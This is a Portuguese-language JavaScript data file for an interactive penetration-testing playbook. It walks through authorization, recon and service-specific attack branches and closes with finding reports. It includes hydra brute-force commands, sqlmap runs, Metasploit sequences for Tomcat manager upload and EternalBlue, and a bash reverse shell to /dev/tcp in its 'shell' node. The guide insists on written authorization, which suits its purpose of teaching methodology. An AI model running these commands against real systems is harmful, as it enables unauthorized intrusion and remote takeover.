/**
 * Phantonite HUB — árvore de decisão do engajamento
 * Cada nó: id, phase, title, say, tone?, blocks[], choices[]
 */
window.HUNTER_PLAYBOOK = {
  meta: {
    name: "Phantonite HUB",
    version: "1.1.0",
    stack: ["gobuster", "wfuzz", "Burp Community", "rlwrap nc", "hydra", "john", "hashcat", "sqlmap", "msf"],
  },

  /* ordem do minimap */
  outline: [
    { id: "roe", label: "RoE" },
    { id: "session", label: "Sessão" },
    { id: "alive", label: "Alvo vivo?" },
    { id: "trio", label: "Trio recon" },
    { id: "ports", label: "Mapa de portas", children: [
      { id: "web", label: "Web" },
      { id: "web-auth", label: "Auth" },
      { id: "tomcat", label: "Tomcat" },
      { id: "smb", label: "SMB" },
      { id: "ssh", label: "SSH" },
      { id: "ftp", label: "FTP" },
      { id: "rdp", label: "RDP" },
      { id: "mysql", label: "MySQL" },
      { id: "mssql", label: "MSSQL" },
      { id: "smtp", label: "SMTP" },
    ]},
    { id: "shell", label: "Shell" },
    { id: "report", label: "Report" },
  ],

  start: "roe",

  nodes: {
    /* ——— START PATH ——— */
    roe: {
      phase: "Briefing",
      title: "Antes de qualquer pacote",
      say: "Bom. Vamos começar o pentest. Primeira pergunta não é técnica: tu está autorizado e o alvo está no escopo?",
      tone: "danger",
      blocks: [
        {
          title: "Checklist mínimo de engajamento",
          html: `<ul>
            <li>Autorização escrita / RoE</li>
            <li>In-scope e out-of-scope claros</li>
            <li>Restrições (DoS, brute, horário, exploração destrutiva)</li>
            <li>Contato de emergência do cliente</li>
          </ul>
          <p>Sem isso, não tem HUB. Tem processo crime.</p>`,
        },
      ],
      choices: [
        { label: "RoE ok — armar a sessão", hint: "Variáveis no bash, pasta de evidências", to: "session" },
        { label: "Ainda não tenho autorização", hint: "Para aqui", to: "stop-roe" },
      ],
    },

    "stop-roe": {
      phase: "Stop",
      title: "Engajamento bloqueado",
      say: "Fecha o guia. Resolve autorização. Volta quando tiver papel na mão.",
      tone: "danger",
      blocks: [],
      choices: [
        { label: "Já resolvi — recomeçar", hint: "Volta ao briefing", to: "roe" },
      ],
    },

    session: {
      phase: "Setup",
      title: "Armar a sessão",
      say: "Isso roda no terminal bash do Kali — o prompt kali@…:~$ — não dentro do msfconsole. O Metasploit só entra quando um ramo pedir.",
      blocks: [
        {
          title: "Cola e ajusta os valores",
          cmd: `export CLIENT="nome-do-cliente"
export IP="IP_DO_ALVO"
export DOMAIN="dominio.se.houver"
export TARGET="http://$IP"
export LHOST="TEU_IP_DE_ATAQUE"
export LPORT="443"
export NOTES="$HOME/engagements/$CLIENT-$(date +%Y%m%d)"
mkdir -p "$NOTES"/{recon,evidence,requests,findings}
cd "$NOTES"
echo "Alvo: $IP | $TARGET" | tee recon/alvo.txt`,
          label: "bash",
          why: "Variáveis de ambiente evitam IP errado no meio do engajamento. LPORT 443 é preferência de callback; se o egress do alvo bloquear, cai pra 4444 no ramo Shell.",
        },
        {
          title: "Onde cada coisa vive",
          html: `<div class="table-wrap"><table>
            <tr><th>Ferramenta</th><th>Onde</th></tr>
            <tr><td>export, nmap, gobuster, curl, rlwrap nc</td><td>Terminal bash</td></tr>
            <tr><td>use / set / run</td><td>msfconsole (depois)</td></tr>
            <tr><td>Repeater / history</td><td>Burp Community</td></tr>
          </table></div>`,
        },
      ],
      choices: [
        { label: "Sessão armada — ver se o alvo responde", hint: "ping + curl", to: "alive" },
      ],
    },

    alive: {
      phase: "Setup",
      title: "O alvo responde?",
      say: "Sanidade antes de scan. Não desperdiça nmap em rota morta.",
      blocks: [
        {
          title: "Checagem rápida",
          cmd: `ping -c 2 "$IP"
curl -sI "$TARGET" | tee recon/headers.txt`,
          label: "bash",
        },
        {
          title: "Como ler",
          html: `<ul>
            <li><strong>Ping falhou, curl ok</strong> — normal (ICMP bloqueado). Segue.</li>
            <li><strong>Os dois falharam</strong> — VPN, IP ou rota. Não inicia o trio ainda.</li>
            <li><strong>curl com HTTPS quebrado</strong> — tenta <code>TARGET=https://…</code> ou <code>-k</code> só pra debug.</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Alvo alcançável — rodar o trio", hint: "dig + nmap + gobuster", to: "trio" },
        { label: "Não alcanço o alvo", hint: "Diagnóstico de rota", to: "dead-target" },
      ],
    },

    "dead-target": {
      phase: "Setup",
      title: "Sem rota até o alvo",
      say: "Antes de culpar a ferramenta, culpa a rede.",
      blocks: [
        {
          title: "Checklist",
          html: `<ul>
            <li><code>ip -4 addr show tun0</code> (VPN THM/HTB up?)</li>
            <li>IP do room/cliente ainda válido?</li>
            <li>Ping no gateway da VPN</li>
            <li><code>TARGET</code> com esquema certo (http vs https)</li>
          </ul>`,
          cmd: `ip -4 addr show tun0
traceroute -n "$IP" | head`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Consertado — testar de novo", to: "alive" },
        { label: "Voltar ao briefing", to: "roe" },
      ],
    },

    trio: {
      phase: "Recon",
      title: "O trio: dig · nmap · gobuster",
      say: "Faz os três. Não escolhe favorito. Isso é o chão do engajamento.",
      blocks: [
        {
          title: "Dig (se houver domínio)",
          cmd: `dig "$DOMAIN" ANY +noall +answer | tee recon/dig.txt
dig "$DOMAIN" NS +short
dig "$DOMAIN" MX +short
dig "$DOMAIN" TXT +short`,
          label: "bash",
          why: "Mapa DNS barato: mail, NS, TXT/SPF, nomes esquecidos. Em IP puro de lab, pula sem drama.",
        },
        {
          title: "Nmap — primeiro passe",
          cmd: `nmap -sV -sC -oA recon/nmap_inicial "$IP"`,
          label: "bash",
          why: "-sV = versão. -sC = scripts default. -oA = salva nos 3 formatos pra evidence.",
        },
        {
          title: "Nmap — amplo (host único / janela ok)",
          cmd: `nmap -sV -sC -p- --min-rate $NMAP_MINRATE -oA recon/nmap_full "$IP"`,
          label: "bash",
        },
        {
          title: "Nmap — scripts vuln (opcional)",
          cmd: `nmap --script vuln -sV -p PORTAS "$IP" -oA recon/nmap_vuln`,
          label: "bash",
          why: "Barulhento e mais agressivo. Só com RoE ok — não é o primeiro pacote em produção sensível.",
        },
        {
          title: "Gobuster — cada HTTP",
          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40 -o recon/gobuster.txt`,
          label: "bash",
          why: "Wordlist tu escolhe por engajamento. Outra porta web (8080, 1234)? Repete o gobuster nela.",
        },
      ],
      choices: [
        { label: "Li o nmap — escolher ramo por porta", hint: "Árvore de serviços", to: "ports" },
      ],
    },

    ports: {
      phase: "Decisão",
      title: "Mapa de portas — o que está aberto?",
      say: "Clica no que bate com a saída do nmap. Vários serviços? Faz um ramo, anota, volta aqui, abre o próximo.",
      blocks: [
        {
          title: "Atalho mental",
          html: `<ul>
            <li>Existe HTTP? <strong>Web primeiro</strong> na maioria dos engajamentos de app.</li>
            <li>Depois: serviço com <strong>versão antiga</strong> explícita.</li>
            <li>Brute só com RoE e rate consciente.</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "80 / 443 / 8080 / HTTP", hint: "Aplicação web", to: "web" },
        { label: "Login / Basic Auth / /login", hint: "Ramo de autenticação", to: "web-auth" },
        { label: "Tomcat /manager", hint: "Deploy / MSF", to: "tomcat" },
        { label: "445 / 139 · SMB", hint: "Shares, EternalBlue, psexec", to: "smb" },
        { label: "22 · SSH", hint: "Credencial", to: "ssh" },
        { label: "21 · FTP", hint: "Anonymous / upload", to: "ftp" },
        { label: "3389 · RDP", hint: "Exposição + cred", to: "rdp" },
        { label: "3306 · MySQL", hint: "DB exposto", to: "mysql" },
        { label: "1433 · MSSQL", hint: "SQL Server", to: "mssql" },
        { label: "25 / 587 · SMTP", hint: "Enum / relay", to: "smtp" },
        { label: "Já tenho RCE — preciso de shell", hint: "Listener", to: "shell" },
        { label: "Achado válido — reportar", hint: "Finding", to: "report" },
      ],
    },

    /* ——— WEB ——— */
    web: {
      phase: "Web",
      title: "Ramo Web",
      say: "Beleza — tem HTTP(S). Trata como produto: mapeia, enumera, aí ataca. Não chuta exploit no escuro.",
      blocks: [
        {
          title: "1. Browser + Burp",
          html: `<ul>
            <li>Scope = hosts in-scope</li>
            <li>Navega como usuário: home, login, register, busca, upload</li>
            <li>Network → XHR/Fetch = API real</li>
            <li>Anota inputs em <code>recon/surface.md</code></li>
          </ul>`,
        },
        {
          title: "2. Gobuster nesta URL",
          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40 -o recon/gobuster_web.txt
curl -s "$TARGET/robots.txt"`,
          label: "bash",
        },
        {
          title: "3. Parâmetro opaco → wfuzz",
          cmd: `curl -s -o /dev/null -w '%{size_download}\\n' "$TARGET/endpoint?x=test"

wfuzz -c -z file,$WORDLIST_PARAMS --hh TAMANHO_NORMAL \\
  -u "$TARGET/endpoint?FUZZ=test"`,
          label: "bash",
          why: "Ajusta --hh/--hc ao tamanho da resposta baseline. Diferença = param existe → Repeater.",
        },
        {
          title: "4. SQLi (ponto já confirmado)",
          cmd: `sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM
# aprofundar:
sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Tem login / auth", to: "web-auth" },
        { label: "Tomcat /manager", to: "tomcat" },
        { label: "RCE / upload — preciso de callback", to: "shell" },
        { label: "Provei impacto — reportar", to: "report" },
        { label: "Voltar ao mapa de portas", to: "ports" },
      ],
    },

    "web-auth": {
      phase: "Web",
      title: "Ramo Auth",
      say: "Auth é onde o dinheiro mora. Captura o POST no Burp antes de sair no hydra.",
      blocks: [
        {
          title: "Manual (Repeater)",
          html: `<ul>
            <li>Página interna sem cookie?</li>
            <li>Cookie do user A na sessão B?</li>
            <li><code>role=admin</code> / claims JWT adulteráveis?</li>
            <li>Erro diferencia user vs senha? (= enum)</li>
            <li>SQLi no campo user — se quebrar, sqlmap no request</li>
          </ul>`,
        },
        {
          title: "Brute (RoE + rate)",
          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
  "$IP" http-post-form \\
  "/login:email=^USER^&password=^PASS^:F=$HYDRA_FAIL"

hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
  "$IP" http-get /caminho/protegido`,
          label: "bash",
          why: "A string F= tem que bater com a mensagem de falha real do app (olha no Burp).",
        },
      ],
      choices: [
        { label: "Entrei — remapear app autenticado", to: "web" },
        { label: "Cred/bypass = finding", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    tomcat: {
      phase: "Web",
      title: "Ramo Tomcat",
      say: "Manager exposto + cred fraca = caminho clássico. Aqui o msfconsole entra de verdade.",
      blocks: [
        {
          title: "Achar manager",
          cmd: `gobuster dir -u "http://$IP:PORTA/" -w $WORDLIST -t 40
curl -sI "http://$IP:PORTA/manager/html"`,
          label: "bash",
        },
        {
          title: "Brute no manager (RoE)",
          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
  "$IP" -s PORTA http-get /manager/html`,
          label: "bash",
        },
        {
          title: "Metasploit",
          cmd: `msfconsole -q`,
          label: "bash → msf",
        },
        {
          title: "Dentro do msf",
          cmd: `search tomcat_mgr
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS IP_DO_ALVO
set RPORT PORTA
set HttpUsername USER
set HttpPassword PASS
set LHOST TEU_LHOST
run`,
          label: "msfconsole",
        },
      ],
      choices: [
        { label: "Sessão/shell caiu", to: "shell" },
        { label: "Reportar acesso ao manager", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— NETWORK SERVICES ——— */
    smb: {
      phase: "Rede",
      title: "Ramo SMB (445 / 139)",
      say: "Enum primeiro. Exploit depois. EternalBlue não é o passo 1 — é o passo quando o OS grita idade.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 139,445 --script smb-os-discovery,smb-security-mode,smb-enum-shares \\
  "$IP" -oA recon/nmap_smb

smbclient -L "//$IP/" -N`,
          label: "bash",
        },
        {
          title: "Stack velho? EternalBlue (RoE!)",
          cmd: `msfconsole -q`,
          label: "bash → msf",
          why: "Win7 / Server 2008 / SMBv1 são o cheiro clássico. Confirma autorização — é exploração pesada.",
        },
        {
          title: "No msf",
          cmd: `search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS IP_DO_ALVO
set LHOST TEU_LHOST
run`,
          label: "msfconsole",
        },
      ],
      choices: [
        { label: "Shell / meterpreter", to: "shell" },
        { label: "Share/info sensível — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    ssh: {
      phase: "Rede",
      title: "Ramo SSH (22)",
      say: "SSH moderno quase nunca é o CVE. É credencial (ou key).",
      blocks: [
        {
          title: "Versão + brute (RoE)",
          cmd: `nmap -sV -p 22 -oA recon/nmap_ssh "$IP"
hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f ssh://"$IP"
ssh user@"$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Acesso indevido — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    ftp: {
      phase: "Rede",
      title: "Ramo FTP (21)",
      say: "Anonymous primeiro. Sempre.",
      blocks: [
        {
          title: "Checagem",
          cmd: `nmap -sV -p 21 --script ftp-anon,ftp-syst -oA recon/nmap_ftp "$IP"
ftp "$IP"
# user: anonymous
# pass: anonymous@`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Upload em dir web — ir pra shell", to: "shell" },
        { label: "Arquivos sensíveis — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    rdp: {
      phase: "Rede",
      title: "Ramo RDP (3389)",
      say: "Exposição + cred. Brute aqui trava conta fácil.",
      tone: "warn",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -oA recon/nmap_rdp "$IP"`,
          label: "bash",
        },
        {
          title: "Brute só com RoE explícito",
          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t 1 -f rdp://"$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Reportar exposição / acesso", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    mysql: {
      phase: "Rede",
      title: "Ramo MySQL (3306)",
      say: "DB na rede = pergunta de superfície antes de dump.",
      blocks: [
        {
          title: "Enum + login",
          cmd: `nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-enum \\
  -oA recon/nmap_mysql "$IP"
mysql -h "$IP" -u root -p`,
          label: "bash",
        },
        {
          title: "Prova de acesso",
          cmd: `SHOW DATABASES;`,
          label: "mysql",
          why: "Prova impacto. Não dumpa o planeta sem necessidade do report.",
        },
      ],
      choices: [
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    mssql: {
      phase: "Rede",
      title: "Ramo MSSQL (1433)",
      say: "Cred + módulos msf/Impacket. xp_cmdshell só se o RoE e o impacto pedirem.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 1433 --script ms-sql-info,ms-sql-empty-password \\
  -oA recon/nmap_mssql "$IP"
msfconsole -q
search mssql`,
          label: "bash / msf",
        },
      ],
      choices: [
        { label: "Consegui exec — shell", to: "shell" },
        { label: "Acesso a dados — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    smtp: {
      phase: "Rede",
      title: "Ramo SMTP (25 / 587)",
      say: "Users vazados alimentam SSH e login web. Relay aberto é finding sozinho.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 25,587 --script smtp-commands,smtp-enum-users \\
  --script-args smtp-enum-users.methods=VRFY \\
  -oA recon/nmap_smtp "$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Users → testar SSH", to: "ssh" },
        { label: "Users → testar login web", to: "web-auth" },
        { label: "Relay/exposição — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— CLOSEOUT ——— */
    shell: {
      phase: "Foothold",
      title: "Listener e shell",
      say: "Listener antes do payload. Sempre. rlwrap nc no bash — a menos que o handler seja do próprio msf.",
      blocks: [
        {
          title: "1. Ouve",
          cmd: `rlwrap nc -lvnp "$LPORT"
# preferência: 443
# fallback: export LPORT=4444`,
          label: "bash",
        },
        {
          title: "2. Callback (exemplo Linux)",
          cmd: `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`,
          label: "alvo",
          why: "O vetor real é o que tu explorou (cmdi, upload, msf). Isto é só o formato clássico de reverse.",
        },
        {
          title: "3. TTY utilizável",
          cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'
# no nc: Ctrl-Z
stty raw -echo; fg
reset
export TERM=xterm`,
          label: "bash",
        },
        {
          title: "4. Evidência mínima",
          cmd: `id
hostname`,
          label: "shell",
        },
      ],
      choices: [
        { label: "Documentar acesso", to: "report" },
        { label: "Ainda há portas no nmap", to: "ports" },
      ],
    },

    report: {
      phase: "Entrega",
      title: "Escrever o finding",
      say: "Achado sem escrito não existe pro cliente. Fecha o pacote e volta ao mapa se ainda houver superfície.",
      blocks: [
        {
          title: "Template",
          cmd: `# [Critical|High|Medium|Low|Info] Título com impacto

**Asset:** URL / host / porta
**Como achou:** nmap → smb → msf / burp → idor / …

## Resumo
2 frases.

## Impacto
O que o atacante faz no negócio.

## Repro
1. …
2. …

## Evidência
evidence/…

## Correção
Controle objetivo.`,
          label: "findings/*.md",
        },
        {
          title: "Severidade rápida",
          html: `<div class="table-wrap"><table>
            <tr><th>Sev</th><th>Exemplo</th></tr>
            <tr><td>Critical</td><td>RCE, admin break, dump massivo</td></tr>
            <tr><td>High</td><td>Auth bypass, leitura sensível multi-user</td></tr>
            <tr><td>Medium</td><td>XSS stored com impacto, SSRF limitado</td></tr>
            <tr><td>Low/Info</td><td>Hardening, exposição sem abuso claro</td></tr>
          </table></div>`,
        },
      ],
      choices: [
        { label: "Próximo serviço do nmap", to: "ports" },
        { label: "Recomeçar engajamento", to: "roe" },
      ],
    },
  },
};
